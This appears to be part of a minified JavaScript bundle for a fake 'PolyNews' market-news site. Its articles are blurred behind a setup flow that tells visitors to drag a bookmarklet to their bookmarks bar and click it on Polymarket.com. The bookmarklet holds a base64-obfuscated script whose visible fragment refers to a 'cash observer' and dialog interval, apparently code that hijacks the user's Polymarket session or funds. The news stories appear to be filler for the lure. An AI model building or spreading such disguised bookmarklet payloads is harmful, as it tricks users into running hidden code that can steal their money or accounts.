VjdCgpO2NsZWFySW50ZXJ2YWwoZSk7Y29uc29sZS5sb2coJ0Nhc2ggb2JzZXJ2ZXIgYW5kIGRpYWxvZyBpbnRlcnZhbCBzdG9wcGVkIGFmdGVyIDEwcycpO2kucmVtb3ZlKCl9LDFlNCl9KSgpOw=='))})();",
                                onClick: y => {
                                    y.preventDefault(),
                                    alert("Please drag this button to your bookmarks bar, then click it while on Polymarket.com to use the bookmarklet!")
                                }
                                ,
                                className: "px-6 py-3 bg-gradient-to-r from-blue-600 to-blue-700 text-white rounded-lg font-semibold cursor-move hover:from-blue-700 hover:to-blue-800 transition-all transform hover:scale-105 select-none flex items-center space-x-2 shadow-lg",
                                draggable: "true",
                                onDragStart: u,
                                children: [c.jsx(Bu, {
                                    className: "h-4 w-4"
                                }), c.jsx("span", {
                                    children: "PolyNews"
                                })]
                            }), c.jsx("div", {
                                className: "text-sm text-gray-600",
                                children: "← Drag this to your bookmarks bar by holding the button and moving your mouse to your bookmarks bar"
                            })]
                        })]
                    })]
                }), c.jsxs("div", {
                    className: "flex items-center justify-between",
                    children: [c.jsx("button", {
                        onClick: () => t(Math.max(0, e - 1)),
                        disabled: e === 0,
                        className: "px-4 py-2 text-gray-600 hover:text-gray-800 disabled:opacity-50 disabled:cursor-not-allowed transition-colors",
                        children: "Previous"
                    }), e < o.length - 1 ? c.jsxs("button", {
                        onClick: () => t(Math.min(o.length - 1, e + 1)),
                        className: "px-6 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center space-x-2",
                        children: [c.jsx("span", {
                            children: "Continue Setup"
                        }), c.jsx(Mf, {
                            className: "h-4 w-4"
                        })]
                    }) : c.jsx("button", {
                        onClick: s,
                        className: "px-6 py-2 bg-gradient-to-r from-green-600 to-emerald-600 text-white rounded-lg hover:from-green-700 hover:to-emerald-700 transition-all",
                        children: "Complete Setup"
                    })]
                })]
            })
        })
    })
}
  , kr = [{
    id: 1,
    title: "Federal Reserve Signals Potential Rate Changes Amid Market Volatility",
    excerpt: "Economic indicators suggest significant monetary policy adjustments may be forthcoming as inflation concerns mount and market participants reassess risk positioning across multiple asset classes.",
    author: "Sarah Chen",
    time: "2 hours ago",
    readTime: "4",
    views: "12.3k",
    imageUrl: "https://images.pexels.com/photos/6801648/pexels-photo-6801648.jpeg?auto=compress&cs=tinysrgb&w=800&h=600&fit=crop"
}, {
    id: 2,
    title: "Tech Giants Report Mixed Earnings as AI Investment Costs Rise",
    excerpt: "Major technology companies showcase divergent performance metrics while continuing substantial investments in artificial intelligence infrastructure and research capabilities.",
    author: "Michael Rodriguez",
    time: "4 hours ago",
    readTime: "6",
    views: "8.7k",
    imageUrl: "https://images.pexels.com/photos/8386440/pexels-photo-8386440.jpeg?auto=compress&cs=tinysrgb&w=800&h=600&fit=crop"
}, {
    id: 3,
    title: "European Energy Markets Face Winter Supply Chain Challenges",
    excerpt: "Continental energy security concerns intensify as multiple supply chain disruptions threaten heating and industrial capacity across key European markets.",
    author: "Elena Petrov",
    time: "6 hours ago",
    readTime: "5",
    views: "15.2k",
    imageUrl: "https://images.pexels.com/photos/9800029/pexels-photo-9800029.jpeg?auto=compress&cs=tinysrgb&w=800&h=600&fit=crop"
}, {
    id: 4,
    title: "Cryptocurrency Regulation Framework Advances Through Legislative Process",
    excerpt: "Comprehensive digital asset legislation moves closer to implementation as regulatory bodies coordinate standardized oversight mechanisms.",
    author: "David Kim",
    time: "8 hours ago",
    readTime: "3",
    views: "9.1k",
    imageUrl: "https://images.pexels.com/photos/8369648/pexels-photo-8369648.jpeg?auto=compress&cs=tinysrgb&w=800&h=600&fit=crop"
}, {
    id: 5,
    title: "Global Supply Chain Resilience Tested by Geopolitical Tensions",
    excerpt: "International trade networks adapt to evolving political landscapes while maintaining critical commodity flows and manufacturing partnerships.",
    author: "Amanda Foster",
    time: "10 hours ago",
    readTime: "7",
    views: "11.5k",
    imageUrl: "https://images.pexels.com/photos/8728382/pexels-photo-8728382.jpeg?auto=compress&cs=tinysrgb&w=800&h=600&fit=crop"
}, {
    id: 6,
    title: "Healthcare Innovation Funding Reaches Record Levels This Quarter",
    excerpt: "Venture capital investment in medical technology and pharmaceutical research achieves unprecedented levels as breakthrough treatments advance toward market readiness.",
    author: "Dr. James Wilson",
    time: "12 hours ago",
    readTime: "5",
    views: "6.8k",
    imageUrl: "https://images.pexels.com/photos/8386434/pexels-photo-8386434.jpeg?auto=compress&cs=tinysrgb&w=800&h=600&fit=crop"
}];
function $f() {
    return c.jsxs("div", {
        className: "min-h-screen bg-gray-50",
        children: [c.jsxs("div", {
            className: "filter blur-sm pointer-events-none select-none",
            children: [c.jsx(Qf, {}), c.jsx("section", {
                className: "bg-white border-b border-gray-200",
                children: c.jsx("div", {
                    className: "max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8",
                    children: c.jsxs("div", {
                        className: "text-center mb-8",
                        children: [c.jsx("h1", {
                            className: "text-4xl md:text-5xl font-bold text-gray-900 mb-4",
                            children: "Real-Time Market Intelligence"
                        }), c.jsx("p", {
                            className: "text-xl text-gray-600 max-w-3xl mx-auto",
                            children: "Stay ahead of market movements with AI-powered news analysis and predictive insights from the world's most trusted financial sources."
                        })]
                    })
                })
            }), c.jsxs("main", {
                className: "max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12",
                children: [c.jsxs("section", {
                    className: "mb-12",
                    children: [c.jsx("h2", {
                        className: "text-2xl font-bold text-gray-900 mb-6",
                        children: "Featured Stories"
                    }), c.jsxs("div", {
                        className: "grid grid-cols-1 md:grid-cols-3 gap-8",
                        children: [c.jsx(xr, {
                            ...kr[0],
                            size: "large"
                        }), c.jsxs("div", {
                            className: "space-y-6",
                            children: [c.jsx(xr, {
                                ...kr[1],
                                size: "small"
                            }), c.jsx(xr, {
                                ...kr[2],
                                size: "small"
                            })]
                        })]
                    })]
                }), c.jsxs("section", {
                    children: [c.jsx("h2", {
                        className: "text-2xl font-bold text-gray-900 mb-6",
                        children: "Latest Analysis"
                    }), c.jsx("div", {
                        className: "grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8",
                        children: kr.slice(3).map(e => c.jsx(xr, {
                            ...e
                        }, e.id))
                    })]
                }), c.jsxs("section", {
                    className: "mt-16 bg-gradient-to-r from-blue-600 to-indigo-700 rounded-2xl p-8 text-center",
                    children: [c.jsx("h2", {
                        className: "text-3xl font-bold text-white mb-4",
                        children: "Never Miss a Market Move"
                    }), c.jsx("p", {
                        className: "text-blue-100 mb-6 max-w-2xl mx-auto",
                        children: "Join over 50,000 traders who rely on PolyNews for real-time market intelligence and predictive analytics."
                    }), c.jsxs("div", {
                        className: "flex flex-col sm:flex-row gap-4 max-w-lg mx-auto",
                        children: [c.jsx("input", {
                            type: "email",
                            placeholder: "Enter your email",
                            className: "flex-1 px-4 py-3 rounded-lg text-gray-900 placeholder-gray-500"
                        }), c.jsx("button", {
                            className: "px-8 py-3 bg-white text-blue-600 font-semibold rounded-lg hover:bg-gray-100 transition-colors",
                            children: "Subscribe"
                        })]
                    })]
                })]
            }), c.jsx("footer", {
                className: "bg-gray-900 text-white py-12 mt-16",
                children: c.jsxs("div", {
                    className: "max-w-7xl mx-auto px-4 sm:px-6 lg:px-8",
                    children: [c.jsxs("div", {
                        className: "grid grid-cols-1 md:grid-cols-4 gap-8",
                        children: [c.jsxs("div", {
                            className: "md:col-span-2",
                            children: [c.jsxs("div", {
                                className: "flex items-center space-x-2 mb-4",
                                children: [c.jsx("div", {
                                    className: "p-2 bg-blue-600 rounded-lg",
                                    children: c.jsx("div", {
                                        className: "h-6 w-6 bg-white rounded"
                                    })
                                }), c.jsx("span", {
                                    className: "text-2xl font-bold",
                                    children: "PolyNews"
                                })]
                            }), c.jsx("p", {
                                className: "text-gray-400 mb-4",
                                children: "Professional market intelligence and predictive analytics for the modern trader."
                            })]
                        }), c.jsxs("div", {
                            children: [c.jsx("h3", {
                                className: "font-semibold mb-4",
                                children: "Categories"
                            }), c.jsxs("ul", {
                                className: "space-y-2 text-gray-400",
                                children: [c.jsx("li", {
                                    children: c.jsx("a", {
                                        href: "#",
                                        className: "hover:text-white transition-colors",
                                        children: "Markets"
                                    })
                                }), c.jsx("li", {
                                    children: c.jsx("a", {
                                        href: "#",
                                        className: "hover:text-white transition-colors",
                                        children: "Politics"
                                    })
                                }), c.jsx("li", {
                                    children: c.jsx("a", {
                                        href: "#",
                                        className: "hover:text-white transition-colors",
                                        children: "Technology"
                                    })
                                }), c.jsx("li", {
                                    children: c.jsx("a", {
                                        href: "#",
                                        className: "hover:text-white transition-colors",
                                        children: "Analysis"
                                    })
                                })]
                            })]
                        }), c.jsxs("div", {
                            children: [c.jsx("h3", {
                                className: "font-semibold mb-4",
                                children: "Company"
                            }), c.jsxs("ul", {
                                className: "space-y-2 text-gray-400",
                                children: [c.jsx("li", {
                                    children: c.jsx("a", {
                                        href: "#",
                                        className: "hover:text-white transition-colors",
                                        children: "About"
                                    })
                                }), c.jsx("li", {
                                    children: c.jsx("a", {
                                        href: "#",
                                        className: "hover:text-white transition-colors",
                                        children: "Contact"
                                    })
                                }), c.jsx("li", {
                                    children: c.jsx("a", {
                                        href: "#",
                                        className: "hover:text-white transition-colors",
                                        children: "Privacy"
                                    })
                                }), c.jsx("li", {
                                    children: c.jsx("a", {
                                        href: "#",
                                        className: "hover:text-white transition-colors",
                                        children: "Terms"
                                    })
                                })]
                            })]
                        })]
                    }), c.jsx("div", {
                        className: "border-t border-gray-800 mt-8 pt-8 text-center text-gray-400",
                        children: c.jsx("p", {
                            children: "© 2024 PolyNews.info. All rights reserved."
                        })
                    })]
                })
            })]
        }), c.jsx(Af, {})]
    })
}
ic(document.getElementById("root")).render(c.jsx(Ge.StrictMode, {
    children: c.jsx($f, {})
}));

